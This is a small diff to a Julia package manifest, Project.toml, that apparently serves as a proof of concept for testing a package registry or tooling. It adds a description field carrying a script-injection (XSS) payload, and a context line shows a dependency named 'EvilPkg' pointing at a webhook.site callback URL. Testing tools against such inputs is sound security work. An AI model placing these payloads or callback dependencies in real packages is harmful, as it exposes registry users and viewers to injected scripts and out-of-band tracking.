@@ -2,6 +2,7 @@ name = "MyJuliaPackage"
 uuid = "e485dcb1-be2b-4c00-aba6-9b0d057c47a5"
 authors = ["a13h1 "]
 version = "0.1.0"
+description = "<script>alert('XSS')</script>"
 [deps]
 EvilPkg = "https://webhook.site/969ace52-aa44-4524-b01d-411115e6d696"
 [registries]
